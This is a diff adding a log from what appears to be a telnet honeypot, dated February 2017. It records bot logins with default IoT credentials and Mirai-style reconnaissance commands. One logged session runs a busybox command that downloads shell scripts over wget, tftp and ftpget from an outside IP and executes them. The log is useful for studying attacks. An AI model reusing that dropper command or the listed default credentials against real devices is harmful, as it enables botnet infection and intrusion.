@@ -1,0 +1,357 @@
+2017-02-25 17:59:13,737 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:01:52,976 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:01:56,383 - __main__ - INFO - Opened connection to 104.7.14.91:59484
+2017-02-25 18:01:59,627 - __main__ - INFO - 104.7.14.91:59484 logged in as root-toor
+2017-02-25 18:02:01,977 - __main__ - INFO - 104.7.14.91:59484: 'l'
+2017-02-25 18:02:03,204 - __main__ - INFO - 104.7.14.91:59484: 'ls'
+2017-02-25 18:02:04,179 - __main__ - INFO - 104.7.14.91:59484: 'ls -la'
+2017-02-25 18:02:12,787 - __main__ - INFO - 104.7.14.91:59484: 'dd'
+2017-02-25 18:02:17,610 - __main__ - INFO - 104.7.14.91:59484: 'exit'
+2017-02-25 18:02:17,694 - __main__ - INFO - Lost connection to 104.7.14.91:59484
+2017-02-25 18:05:34,424 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:05:45,887 - __main__ - INFO - Opened connection to 104.7.14.91:59492
+2017-02-25 18:05:47,833 - __main__ - INFO - 104.7.14.91:59492 logged in as root-toor
+2017-02-25 18:05:48,539 - __main__ - INFO - 104.7.14.91:59492: 'ls'
+2017-02-25 18:05:51,019 - __main__ - INFO - 104.7.14.91:59492: 'ls'
+2017-02-25 18:05:51,920 - __main__ - INFO - 104.7.14.91:59492: 'ls -la'
+2017-02-25 18:05:52,593 - __main__ - INFO - 104.7.14.91:59492: 'exit'
+2017-02-25 18:05:52,672 - __main__ - INFO - Lost connection to 104.7.14.91:59492
+2017-02-25 18:06:01,009 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:06:02,054 - __main__ - INFO - Opened connection to 104.7.14.91:59494
+2017-02-25 18:07:02,255 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:07:03,937 - __main__ - INFO - Opened connection to 104.7.14.91:59496
+2017-02-25 18:07:06,938 - __main__ - INFO - 104.7.14.91:59496 logged in as root-toor
+2017-02-25 18:07:08,527 - __main__ - INFO - 104.7.14.91:59496: 'dd'
+2017-02-25 18:07:11,228 - __main__ - INFO - 104.7.14.91:59496: 'ls'
+2017-02-25 18:07:11,959 - __main__ - INFO - 104.7.14.91:59496: 'ls -la'
+2017-02-25 18:07:15,162 - __main__ - INFO - 104.7.14.91:59496: 'exit'
+2017-02-25 18:07:15,240 - __main__ - INFO - Lost connection to 104.7.14.91:59496
+2017-02-25 18:07:21,455 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:10:43,134 - __main__ - INFO - Opened connection to 176.33.177.161:59470
+2017-02-25 18:10:43,935 - __main__ - INFO - 176.33.177.161:59470 logged in as administrator-1234
+2017-02-25 18:10:44,153 - __main__ - INFO - 176.33.177.161:59470: 'enable'
+2017-02-25 18:10:44,212 - __main__ - INFO - 176.33.177.161:59470: 'shell'
+2017-02-25 18:10:44,212 - __main__ - INFO - 176.33.177.161:59470: 'sh'
+2017-02-25 18:10:44,429 - __main__ - INFO - 176.33.177.161:59470: 'cat /proc/mounts; /bin/busybox DRUQQ'
+2017-02-25 18:10:44,915 - __main__ - INFO - 176.33.177.161:59470: 'cd #; (cat .s || cp /bin/echo .s); /bin/busybox DRUQQ'
+2017-02-25 18:10:45,369 - __main__ - INFO - 176.33.177.161:59470: 'nc; wget; /bin/busybox DRUQQ'
+2017-02-25 18:10:45,720 - __main__ - INFO - 176.33.177.161:59470: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:10:45,937 - __main__ - INFO - 176.33.177.161:59470: '/bin/busybox DRUQQ'
+2017-02-25 18:10:46,004 - __main__ - INFO - 176.33.177.161:59470: 'rm .s; exit'
+2017-02-25 18:10:46,123 - __main__ - INFO - Lost connection to 176.33.177.161:59470
+2017-02-25 18:11:42,260 - __main__ - INFO - Opened connection to 187.36.35.108:46956
+2017-02-25 18:11:45,238 - __main__ - INFO - Opened connection to 187.36.35.108:46970
+2017-02-25 18:11:46,269 - __main__ - INFO - Opened connection to 187.36.35.108:46962
+2017-02-25 18:11:49,322 - __main__ - INFO - Opened connection to 187.36.35.108:47004
+2017-02-25 18:11:54,145 - __main__ - INFO - Opened connection to 188.86.46.130:35566
+2017-02-25 18:12:00,238 - __main__ - INFO - Opened connection to 187.36.35.108:47067
+2017-02-25 18:12:13,248 - __main__ - INFO - Opened connection to 187.36.35.108:47162
+2017-02-25 18:12:13,767 - __main__ - INFO - Lost connection to 187.36.35.108:46956
+2017-02-25 18:12:17,791 - __main__ - INFO - Lost connection to 187.36.35.108:46962
+2017-02-25 18:12:18,899 - __main__ - INFO - Lost connection to 187.36.35.108:46970
+2017-02-25 18:12:23,850 - __main__ - INFO - Lost connection to 187.36.35.108:47004
+2017-02-25 18:12:26,645 - __main__ - INFO - Lost connection to 188.86.46.130:35566
+2017-02-25 18:12:31,765 - __main__ - INFO - Lost connection to 187.36.35.108:47067
+2017-02-25 18:12:47,761 - __main__ - INFO - Lost connection to 187.36.35.108:47162
+2017-02-25 18:19:23,434 - __main__ - INFO - Opened connection to 178.47.102.238:35830
+2017-02-25 18:19:54,890 - __main__ - INFO - Lost connection to 178.47.102.238:35830
+2017-02-25 18:23:21,600 - __main__ - INFO - Opened connection to 104.7.14.91:59554
+2017-02-25 18:23:25,822 - __main__ - INFO - 104.7.14.91:59554 logged in as toor-root
+2017-02-25 18:23:27,145 - __main__ - INFO - 104.7.14.91:59554: 'dd'
+2017-02-25 18:23:31,762 - __main__ - INFO - 104.7.14.91:59554: 'exit'
+2017-02-25 18:23:31,848 - __main__ - INFO - Lost connection to 104.7.14.91:59554
+2017-02-25 18:23:39,324 - __main__ - INFO - Opened connection to 39.181.246.222:20887
+2017-02-25 18:23:53,956 - __main__ - INFO - Opened connection to 104.7.14.91:59556
+2017-02-25 18:23:55,473 - __main__ - INFO - 104.7.14.91:59556 logged in as root-toor
+2017-02-25 18:23:57,301 - __main__ - INFO - 104.7.14.91:59556: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:23:59,397 - __main__ - INFO - 39.181.246.222:20887 logged in as root-xc3511
+2017-02-25 18:24:06,887 - __main__ - INFO - 39.181.246.222:20887: 'sh'
+2017-02-25 18:24:07,144 - __main__ - INFO - 39.181.246.222:20887: 'shell'
+2017-02-25 18:24:07,145 - __main__ - INFO - 39.181.246.222:20887: 'system'
+2017-02-25 18:24:07,203 - __main__ - INFO - 39.181.246.222:20887: 'enable'
+2017-02-25 18:24:11,007 - __main__ - INFO - 39.181.246.222:20887: '>/tmp/.ptmx && cd /tmp/'
+2017-02-25 18:24:11,291 - __main__ - INFO - 39.181.246.222:20887: '>/var/.ptmx && cd /var/'
+2017-02-25 18:24:11,356 - __main__ - INFO - 39.181.246.222:20887: '>/var/run/.ptmx && cd /var/run/'
+2017-02-25 18:24:11,422 - __main__ - INFO - 39.181.246.222:20887: '>/dev/.ptmx && cd /dev/'
+2017-02-25 18:24:11,485 - __main__ - INFO - 39.181.246.222:20887: '>/dev/netslink/.ptmx && cd /dev/netslink/'
+2017-02-25 18:24:11,534 - __main__ - INFO - 39.181.246.222:20887: '>/.ptmx && cd /'
+2017-02-25 18:24:11,598 - __main__ - INFO - 39.181.246.222:20887: '>/dev/shm/.ptmx && cd /dev/shm/'
+2017-02-25 18:24:11,655 - __main__ - INFO - 39.181.246.222:20887: '>/mnt/.ptmx && cd /mnt/'
+2017-02-25 18:24:11,713 - __main__ - INFO - 39.181.246.222:20887: '>/boot/.ptmx && cd /boot/'
+2017-02-25 18:24:15,048 - __main__ - INFO - 39.181.246.222:20887: '/bin/busybox wget http://95.215.62.11:80/bin.sh -O - > bin.sh && sh bin.sh; /bin/busybox tftp -r bin2.sh -l bin2.sh -g 95.215.62.11 && sh bin2.sh; /bin/busybox ftpget -u anonymous -p anonymous bin3.sh bin3.sh 95.215.62.11 && sh bin3.sh'
+2017-02-25 18:25:09,279 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:27:34,333 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:27:37,934 - __main__ - INFO - Opened connection to 104.7.14.91:59562
+2017-02-25 18:27:40,283 - __main__ - INFO - 104.7.14.91:59562 logged in as root-toor
+2017-02-25 18:27:41,144 - __main__ - INFO - 104.7.14.91:59562: 'dd'
+2017-02-25 18:27:49,317 - __main__ - INFO - 104.7.14.91:59562: '''
+2017-02-25 18:27:50,044 - __main__ - INFO - 104.7.14.91:59562: '''
+2017-02-25 18:27:50,108 - __main__ - INFO - 104.7.14.91:59562: '"'
+2017-02-25 18:27:52,535 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:28:25,732 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:28:27,565 - __main__ - INFO - Opened connection to 104.7.14.91:59570
+2017-02-25 18:28:30,424 - __main__ - INFO - 104.7.14.91:59570 logged in as toor-root
+2017-02-25 18:28:31,805 - __main__ - INFO - 104.7.14.91:59570: 'dd'
+2017-02-25 18:28:49,349 - __main__ - INFO - 104.7.14.91:59570: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:29:55,285 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:29:58,348 - __main__ - INFO - Opened connection to 104.7.14.91:59578
+2017-02-25 18:30:00,652 - __main__ - INFO - 104.7.14.91:59578 logged in as root-toor
+2017-02-25 18:30:01,906 - __main__ - INFO - 104.7.14.91:59578: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:30:08,286 - __main__ - INFO - 104.7.14.91:59578: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:30:10,541 - __main__ - INFO - 104.7.14.91:59578: 'exit'
+2017-02-25 18:30:10,634 - __main__ - INFO - Lost connection to 104.7.14.91:59578
+2017-02-25 18:34:43,127 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:35:55,593 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:39:38,025 - __main__ - INFO - Opened connection to 94.55.6.61:44806
+2017-02-25 18:40:09,283 - __main__ - INFO - Lost connection to 94.55.6.61:44806
+2017-02-25 18:44:14,375 - __main__ - INFO - Opened connection to 117.214.84.25:43092
+2017-02-25 18:44:14,720 - __main__ - INFO - Opened connection to 117.214.84.25:43091
+2017-02-25 18:44:16,558 - __main__ - INFO - 117.214.84.25:43092 logged in as guest-12345
+2017-02-25 18:44:16,568 - __main__ - INFO - 117.214.84.25:43091 logged in as root-54321
+2017-02-25 18:44:16,845 - __main__ - INFO - 117.214.84.25:43092: 'enable'
+2017-02-25 18:44:16,904 - __main__ - INFO - 117.214.84.25:43092: 'shell'
+2017-02-25 18:44:16,904 - __main__ - INFO - 117.214.84.25:43091: 'enable'
+2017-02-25 18:44:16,966 - __main__ - INFO - 117.214.84.25:43092: 'sh'
+2017-02-25 18:44:16,966 - __main__ - INFO - 117.214.84.25:43091: 'shell'
+2017-02-25 18:44:16,966 - __main__ - INFO - 117.214.84.25:43091: 'sh'
+2017-02-25 18:44:17,189 - __main__ - INFO - 117.214.84.25:43092: 'cat /proc/mounts; /bin/busybox ZZWZR'
+2017-02-25 18:44:17,316 - __main__ - INFO - 117.214.84.25:43091: 'cat /proc/mounts; /bin/busybox NUOBB'
+2017-02-25 18:44:17,810 - __main__ - INFO - 117.214.84.25:43092: 'cd #; (cat .s || cp /bin/echo .s); /bin/busybox ZZWZR'
+2017-02-25 18:44:18,073 - __main__ - INFO - 117.214.84.25:43091: 'cd #; (cat .s || cp /bin/echo .s); /bin/busybox NUOBB'
+2017-02-25 18:44:18,359 - __main__ - INFO - 117.214.84.25:43092: 'nc; wget; /bin/busybox ZZWZR'
+2017-02-25 18:44:18,776 - __main__ - INFO - 117.214.84.25:43091: 'nc; wget; /bin/busybox NUOBB'
+2017-02-25 18:44:18,883 - __main__ - INFO - 117.214.84.25:43092: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:44:19,074 - __main__ - INFO - 117.214.84.25:43092: '/bin/busybox ZZWZR'
+2017-02-25 18:44:19,171 - __main__ - INFO - 117.214.84.25:43092: 'rm .s; exit'
+2017-02-25 18:44:19,306 - __main__ - INFO - 117.214.84.25:43091: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:44:19,306 - __main__ - INFO - Lost connection to 117.214.84.25:43092
+2017-02-25 18:44:19,462 - __main__ - INFO - 117.214.84.25:43091: '/bin/busybox NUOBB'
+2017-02-25 18:44:19,757 - __main__ - INFO - 117.214.84.25:43091: 'rm .s; exit'
+2017-02-25 18:44:19,874 - __main__ - INFO - Lost connection to 117.214.84.25:43091
+2017-02-25 18:44:54,243 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:47:30,305 - __main__ - INFO - Opened connection to 138.68.51.103:44856
+2017-02-25 18:47:44,086 - __main__ - INFO - 138.68.51.103:44856 logged in as exit-quit
+2017-02-25 18:47:46,413 - __main__ - INFO - 138.68.51.103:44856: '"'
+2017-02-25 18:48:05,517 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:48:36,404 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:48:55,041 - __main__ - INFO - Opened connection to 138.68.51.103:44860
+2017-02-25 18:48:58,376 - __main__ - INFO - 138.68.51.103:44860 logged in as root-toor
+2017-02-25 18:49:02,790 - __main__ - INFO - 138.68.51.103:44860: 'cat /proc/mounts'
+2017-02-25 18:49:08,094 - __main__ - INFO - 138.68.51.103:44860: 'cat /proc/mounts'
+2017-02-25 18:49:14,525 - __main__ - INFO - 138.68.51.103:44860: 'exit'
+2017-02-25 18:49:14,608 - __main__ - INFO - Lost connection to 138.68.51.103:44860
+2017-02-25 18:49:46,191 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 18:49:52,810 - __main__ - INFO - Opened connection to 138.68.51.103:44862
+2017-02-25 18:49:55,644 - __main__ - INFO - 138.68.51.103:44862 logged in as root-toor
+2017-02-25 18:49:57,165 - __main__ - INFO - 138.68.51.103:44862: 'ls'
+2017-02-25 18:49:58,177 - __main__ - INFO - 138.68.51.103:44862: 'ls -la'
+2017-02-25 18:50:02,450 - __main__ - INFO - 138.68.51.103:44862: 'cat /proc/mounts'
+2017-02-25 18:50:04,741 - __main__ - INFO - 138.68.51.103:44862: 'exit'
+2017-02-25 18:50:04,829 - __main__ - INFO - Lost connection to 138.68.51.103:44862
+2017-02-25 18:51:05,173 - __main__ - INFO - Opened connection to 14.172.244.43:40236
+2017-02-25 18:51:05,832 - __main__ - INFO - 14.172.244.43:40236 logged in as root-12345
+2017-02-25 18:51:06,019 - __main__ - INFO - 14.172.244.43:40236: 'enable'
+2017-02-25 18:51:06,067 - __main__ - INFO - 14.172.244.43:40236: 'shell'
+2017-02-25 18:51:06,067 - __main__ - INFO - 14.172.244.43:40236: 'sh'
+2017-02-25 18:51:06,254 - __main__ - INFO - 14.172.244.43:40236: 'cat /proc/mounts; /bin/busybox VDEJN'
+2017-02-25 18:51:06,667 - __main__ - INFO - 14.172.244.43:40236: 'cd root@cam12:~#; (cat .s || cp /bin/echo .s); /bin/busybox VDEJN'
+2017-02-25 18:51:07,088 - __main__ - INFO - 14.172.244.43:40236: 'nc; wget; /bin/busybox VDEJN'
+2017-02-25 18:51:07,373 - __main__ - INFO - 14.172.244.43:40236: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 18:51:07,559 - __main__ - INFO - 14.172.244.43:40236: '/bin/busybox VDEJN'
+2017-02-25 18:51:07,624 - __main__ - INFO - 14.172.244.43:40236: 'rm .s; exit'
+2017-02-25 18:51:07,739 - __main__ - INFO - Lost connection to 14.172.244.43:40236
+2017-02-25 19:06:29,783 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:08:02,151 - __main__ - INFO - Opened connection to 86.35.223.102:60035
+2017-02-25 19:08:32,841 - __main__ - INFO - Lost connection to 86.35.223.102:60035
+2017-02-25 19:09:37,384 - __main__ - INFO - Opened connection to 42.117.114.66:51121
+2017-02-25 19:09:38,195 - __main__ - INFO - 42.117.114.66:51121 logged in as root-user
+2017-02-25 19:09:38,399 - __main__ - INFO - 42.117.114.66:51121: 'enable'
+2017-02-25 19:09:38,471 - __main__ - INFO - 42.117.114.66:51121: 'shell'
+2017-02-25 19:09:38,471 - __main__ - INFO - 42.117.114.66:51121: 'sh'
+2017-02-25 19:09:38,671 - __main__ - INFO - 42.117.114.66:51121: 'cat /proc/mounts; /bin/busybox VGSIK'
+2017-02-25 19:09:39,106 - __main__ - INFO - 42.117.114.66:51121: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox VGSIK'
+2017-02-25 19:09:39,543 - __main__ - INFO - 42.117.114.66:51121: 'nc; wget; /bin/busybox VGSIK'
+2017-02-25 19:09:39,863 - __main__ - INFO - 42.117.114.66:51121: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:09:40,062 - __main__ - INFO - 42.117.114.66:51121: '/bin/busybox VGSIK'
+2017-02-25 19:09:40,134 - __main__ - INFO - 42.117.114.66:51121: 'rm .s; exit'
+2017-02-25 19:09:40,255 - __main__ - INFO - Lost connection to 42.117.114.66:51121
+2017-02-25 19:09:55,462 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:10:52,668 - __main__ - INFO - Opened connection to 95.8.10.95:53636
+2017-02-25 19:10:53,462 - __main__ - INFO - 95.8.10.95:53636 logged in as root-1234
+2017-02-25 19:10:53,686 - __main__ - INFO - 95.8.10.95:53636: 'enable'
+2017-02-25 19:10:53,743 - __main__ - INFO - 95.8.10.95:53636: 'shell'
+2017-02-25 19:10:53,744 - __main__ - INFO - 95.8.10.95:53636: 'sh'
+2017-02-25 19:10:53,974 - __main__ - INFO - 95.8.10.95:53636: 'cat /proc/mounts; /bin/busybox IOCLB'
+2017-02-25 19:10:54,471 - __main__ - INFO - 95.8.10.95:53636: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox IOCLB'
+2017-02-25 19:10:54,929 - __main__ - INFO - 95.8.10.95:53636: 'nc; wget; /bin/busybox IOCLB'
+2017-02-25 19:10:55,282 - __main__ - INFO - 95.8.10.95:53636: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:10:55,508 - __main__ - INFO - 95.8.10.95:53636: '/bin/busybox IOCLB'
+2017-02-25 19:10:55,595 - __main__ - INFO - 95.8.10.95:53636: 'rm .s; exit'
+2017-02-25 19:10:55,775 - __main__ - INFO - Lost connection to 95.8.10.95:53636
+2017-02-25 19:11:25,552 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:11:38,154 - __main__ - INFO - Opened connection to 104.7.14.91:60174
+2017-02-25 19:11:45,138 - __main__ - INFO - 104.7.14.91:60174 logged in as root-toor
+2017-02-25 19:11:52,405 - __main__ - INFO - 104.7.14.91:60174: 'cat /proc/mounts; /bin/busybox IOCLB'
+2017-02-25 19:12:03,976 - __main__ - INFO - Opened connection to 77.159.74.165:36893
+2017-02-25 19:12:04,700 - __main__ - INFO - 77.159.74.165:36893 logged in as admin-54321
+2017-02-25 19:12:04,908 - __main__ - INFO - 77.159.74.165:36893: 'enable'
+2017-02-25 19:12:04,967 - __main__ - INFO - 77.159.74.165:36893: 'shell'
+2017-02-25 19:12:04,968 - __main__ - INFO - 77.159.74.165:36893: 'sh'
+2017-02-25 19:12:05,175 - __main__ - INFO - 77.159.74.165:36893: 'cat /proc/mounts; /bin/busybox PEOAM'
+2017-02-25 19:12:05,631 - __main__ - INFO - 77.159.74.165:36893: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox PEOAM'
+2017-02-25 19:12:06,150 - __main__ - INFO - 77.159.74.165:36893: 'nc; wget; /bin/busybox PEOAM'
+2017-02-25 19:12:06,471 - __main__ - INFO - 77.159.74.165:36893: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:12:06,677 - __main__ - INFO - 77.159.74.165:36893: '/bin/busybox PEOAM'
+2017-02-25 19:12:06,738 - __main__ - INFO - 77.159.74.165:36893: 'rm .s; exit'
+2017-02-25 19:12:06,856 - __main__ - INFO - Lost connection to 77.159.74.165:36893
+2017-02-25 19:12:09,861 - __main__ - INFO - 104.7.14.91:60174: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox IOCLB'
+2017-02-25 19:12:20,763 - __main__ - INFO - 104.7.14.91:60174: 'nc; wget; /bin/busybox IOCLB'
+2017-02-25 19:12:30,365 - __main__ - INFO - 104.7.14.91:60174: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:12:37,300 - __main__ - INFO - 104.7.14.91:60174: '/bin/busybox IOCLB'
+2017-02-25 19:12:42,905 - __main__ - INFO - 104.7.14.91:60174: 'rm .s; exit'
+2017-02-25 19:12:44,981 - __main__ - INFO - 104.7.14.91:60174: 'exit'
+2017-02-25 19:12:45,086 - __main__ - INFO - Lost connection to 104.7.14.91:60174
+2017-02-25 19:13:04,706 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:13:05,814 - __main__ - INFO - Opened connection to 104.7.14.91:60178
+2017-02-25 19:13:07,955 - __main__ - INFO - 104.7.14.91:60178 logged in as root-toor
+2017-02-25 19:13:08,431 - __main__ - INFO - 104.7.14.91:60178: 'dd'
+2017-02-25 19:13:11,467 - __main__ - INFO - 104.7.14.91:60178: 'exit'
+2017-02-25 19:13:11,589 - __main__ - INFO - Lost connection to 104.7.14.91:60178
+2017-02-25 19:13:25,348 - __main__ - INFO - Opened connection to 87.225.102.62:33963
+2017-02-25 19:14:04,520 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:14:25,844 - __main__ - INFO - Opened connection to 104.7.14.91:60184
+2017-02-25 19:14:27,911 - __main__ - INFO - 104.7.14.91:60184 logged in as root-toor
+2017-02-25 19:14:37,199 - __main__ - INFO - 104.7.14.91:60184: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:14:40,768 - __main__ - INFO - 104.7.14.91:60184: 'exit'
+2017-02-25 19:14:40,848 - __main__ - INFO - Lost connection to 104.7.14.91:60184
+2017-02-25 19:15:04,433 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:15:05,909 - __main__ - INFO - Opened connection to 104.7.14.91:60186
+2017-02-25 19:15:09,363 - __main__ - INFO - 104.7.14.91:60186 logged in as root-toor
+2017-02-25 19:15:12,372 - __main__ - INFO - 104.7.14.91:60186: 'exit'
+2017-02-25 19:15:12,465 - __main__ - INFO - Lost connection to 104.7.14.91:60186
+2017-02-25 19:15:42,534 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:15:44,148 - __main__ - INFO - Opened connection to 104.7.14.91:60188
+2017-02-25 19:15:50,006 - __main__ - INFO - 104.7.14.91:60188 logged in as exit-quit
+2017-02-25 19:16:07,325 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:16:08,459 - __main__ - INFO - Opened connection to 104.7.14.91:60192
+2017-02-25 19:16:10,875 - __main__ - INFO - 104.7.14.91:60192 logged in as root-toor
+2017-02-25 19:16:16,968 - __main__ - INFO - 104.7.14.91:60192: 'exit'
+2017-02-25 19:16:17,054 - __main__ - INFO - Lost connection to 104.7.14.91:60192
+2017-02-25 19:17:37,380 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:17:38,755 - __main__ - INFO - Opened connection to 104.7.14.91:60340
+2017-02-25 19:17:41,197 - __main__ - INFO - 104.7.14.91:60340 logged in as root-toor
+2017-02-25 19:17:44,902 - __main__ - INFO - 104.7.14.91:60340: 'exit'
+2017-02-25 19:17:44,967 - __main__ - INFO - Lost connection to 104.7.14.91:60340
+2017-02-25 19:17:46,108 - __main__ - INFO - Opened connection to 104.7.14.91:60342
+2017-02-25 19:17:51,400 - __main__ - INFO - 104.7.14.91:60342 logged in as root-exit
+2017-02-25 19:17:51,846 - __main__ - INFO - 104.7.14.91:60342: 'quit'
+2017-02-25 19:17:51,922 - __main__ - INFO - Lost connection to 104.7.14.91:60342
+2017-02-25 19:17:55,274 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:18:35,510 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:18:37,005 - __main__ - INFO - Opened connection to 104.7.14.91:60354
+2017-02-25 19:18:39,799 - __main__ - INFO - 104.7.14.91:60354 logged in as root-toor
+2017-02-25 19:18:40,935 - __main__ - INFO - 104.7.14.91:60354: 'exit'
+2017-02-25 19:18:41,067 - __main__ - INFO - Lost connection to 104.7.14.91:60354
+2017-02-25 19:19:08,582 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:19:09,656 - __main__ - INFO - Opened connection to 104.7.14.91:60358
+2017-02-25 19:19:12,619 - __main__ - INFO - 104.7.14.91:60358 logged in as root-toor
+2017-02-25 19:19:14,230 - __main__ - INFO - 104.7.14.91:60358: 'exit'
+2017-02-25 19:19:14,313 - __main__ - INFO - Lost connection to 104.7.14.91:60358
+2017-02-25 19:19:27,045 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:19:28,384 - __main__ - INFO - Opened connection to 104.7.14.91:60360
+2017-02-25 19:19:30,067 - __main__ - INFO - 104.7.14.91:60360 logged in as root-toor
+2017-02-25 19:19:31,195 - __main__ - INFO - 104.7.14.91:60360: 'exit'
+2017-02-25 19:19:31,298 - __main__ - INFO - Lost connection to 104.7.14.91:60360
+2017-02-25 19:30:36,332 - __main__ - INFO - Opened connection to 104.7.14.91:60522
+2017-02-25 19:30:39,160 - __main__ - INFO - 104.7.14.91:60522 logged in as root-toor
+2017-02-25 19:30:44,925 - __main__ - INFO - 104.7.14.91:60522: 'dd'
+2017-02-25 19:30:47,269 - __main__ - INFO - 104.7.14.91:60522: 'exit'
+2017-02-25 19:30:47,351 - __main__ - INFO - Lost connection to 104.7.14.91:60522
+2017-02-25 19:30:55,833 - __main__ - INFO - Opened connection to 104.7.14.91:60524
+2017-02-25 19:30:58,026 - __main__ - INFO - 104.7.14.91:60524 logged in as exit-exit
+2017-02-25 19:30:58,827 - __main__ - INFO - 104.7.14.91:60524: 'exit'
+2017-02-25 19:30:58,908 - __main__ - INFO - Lost connection to 104.7.14.91:60524
+2017-02-25 19:31:19,139 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:31:24,903 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:31:56,805 - __main__ - INFO - Opened connection to 201.175.69.63:35836
+2017-02-25 19:31:57,237 - __main__ - INFO - 201.175.69.63:35836 logged in as root-vizxv
+2017-02-25 19:31:57,301 - __main__ - INFO - 201.175.69.63:35836: 'enable'
+2017-02-25 19:31:57,361 - __main__ - INFO - 201.175.69.63:35836: 'shell'
+2017-02-25 19:31:57,362 - __main__ - INFO - 201.175.69.63:35836: 'sh'
+2017-02-25 19:31:57,426 - __main__ - INFO - 201.175.69.63:35836: 'cat /proc/mounts; /bin/busybox FHDVD'
+2017-02-25 19:31:57,619 - __main__ - INFO - 201.175.69.63:35836: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox FHDVD'
+2017-02-25 19:31:57,911 - __main__ - INFO - 201.175.69.63:35836: 'nc; wget; /bin/busybox FHDVD'
+2017-02-25 19:31:58,096 - __main__ - INFO - 201.175.69.63:35836: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:31:58,160 - __main__ - INFO - 201.175.69.63:35836: '/bin/busybox FHDVD'
+2017-02-25 19:31:58,219 - __main__ - INFO - 201.175.69.63:35836: 'rm .s; exit'
+2017-02-25 19:31:58,322 - __main__ - INFO - Lost connection to 201.175.69.63:35836
+2017-02-25 19:32:44,495 - __main__ - INFO - Opened connection to 104.7.14.91:60534
+2017-02-25 19:32:46,444 - __main__ - INFO - 104.7.14.91:60534 logged in as root-toor
+2017-02-25 19:32:51,294 - __main__ - INFO - 104.7.14.91:60534: 'enable'
+2017-02-25 19:32:52,017 - __main__ - INFO - Opened connection to 178.223.16.4:58683
+2017-02-25 19:32:52,514 - __main__ - INFO - 104.7.14.91:60534: 'shell'
+2017-02-25 19:32:52,951 - __main__ - INFO - 178.223.16.4:58683 logged in as root-juantech
+2017-02-25 19:32:53,434 - __main__ - INFO - 178.223.16.4:58683: 'enable'
+2017-02-25 19:32:53,493 - __main__ - INFO - 178.223.16.4:58683: 'shell'
+2017-02-25 19:32:53,493 - __main__ - INFO - 178.223.16.4:58683: 'sh'
+2017-02-25 19:32:53,819 - __main__ - INFO - 178.223.16.4:58683: 'cat /proc/mounts; /bin/busybox ATLQX'
+2017-02-25 19:32:54,231 - __main__ - INFO - 104.7.14.91:60534: 'shell'
+2017-02-25 19:32:54,508 - __main__ - INFO - 178.223.16.4:58683: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox ATLQX'
+2017-02-25 19:32:55,063 - __main__ - INFO - 178.223.16.4:58683: 'nc; wget; /bin/busybox ATLQX'
+2017-02-25 19:32:55,551 - __main__ - INFO - 178.223.16.4:58683: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:32:55,816 - __main__ - INFO - 104.7.14.91:60534: 'sh'
+2017-02-25 19:32:55,876 - __main__ - INFO - 178.223.16.4:58683: '/bin/busybox ATLQX'
